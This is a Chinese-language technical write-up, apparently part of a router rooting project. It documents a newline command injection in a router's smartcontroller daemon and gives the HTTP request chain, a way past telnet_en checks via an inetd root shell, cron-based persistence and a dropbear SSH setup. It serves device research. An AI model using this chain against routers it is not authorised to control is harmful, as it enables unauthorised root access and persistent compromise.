# 技术细节

## 注入点定位

`/usr/sbin/smartcontroller` 处理 `scene_setting` 时把 action.payload（JSON 字符串）里的 `mac`、`wan` 直接替换进：

```
snprintf(buf, "… set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit", mac, wan)
system(buf)
```

`mac` 没有任何转义 → 换行即命令注入。限制是 fortify `snprintf` 输出长度 ≈97 字符，减去模板固定部分后，注入命令 ≤18 字符。

## 调用链

```
POST /cgi-bin/luci/api/xqsystem/login        -> token
POST /cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller
    {"command":"scene_setting","id":0,"launch":{"mode":"home"},
     "action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,
                     "payload":"{\"command\":\"wan_block\",\"mac\":\"AA\n<CMD>\n\"}"}]}
    -> daemon 保存场景并回 id
POST 同上 {"command":"scene_start","id":<id>} -> 执行
```

`payload` 是**字符串形式**的内层 JSON（需要二次转义）。

## 为什么直接 telnetd 不行

busybox 里有 `bdata get telnet_en` / `nvram get telnet_en` 检查——裸 `telnetd` 进程秒退、不绑端口。LuCI 的 `set_telnet` 接口又被 `apps.telnet` 特性开关挡住（release 分支不注册）。绕过：inetd 不查 telnet_en，直接给 `/bin/sh`。

## 持久化模型

- `/etc` = ramfs，每次启动从 squashfs 重建 → 运行期写入全失
- `/etc/crontabs`、`/etc/config` 绑到 sec_cfg ext4 → 持久
- `/data`（UBIFS）→ 持久，放 hostkey / persist.sh / authorized_keys
- `/etc/crontabs/root` 末尾加 `* * * * * sh /data/persist.sh` → 每分钟自愈

## 备选：dropbear 而不是 inetd

1. `rm /etc/dropbear/dropbear_rsa_host_key`（0 字节占位文件必须删掉，否则 keygen 报 File exists）
2. `dropbearkey -t rsa -f /data/dropbear_rsa_host_key`（~1 分钟，IPQ5312 上 RSA-2048 慢）
3. `dropbear -r /data/dropbear_rsa_host_key -B` → ssh 通
4. `authorized_keys` 放 `/etc/dropbear/authorized_keys`（运行期有效，persist.sh 每次恢复）

## 其他未走通/未验证

- `nvram set telnet_en=1` / `bdata set telnet_en=1`：命令执行了但 `nvram show`/`bdata show` 里仍为空，疑似 lanap 模式下 nvram 后端不生效——未深究，inetd 路线不需要它
- XMiR-Patcher 所有 LuCI 注入点（arn_switch/start_binding/set_mac_filter/datacenter7/Smartcontroller 老路径/get_icon）：1.0.41 全封
- `set_macfilter_rules` / `set_global_enable`：RD16 未注册对应 API 路由
- `openssl` 在设备上可用（`openssl passwd -1`、`enc -d -base64 -in/-out`），可用来写任意二进制（dropbear hostkey 备选路径）
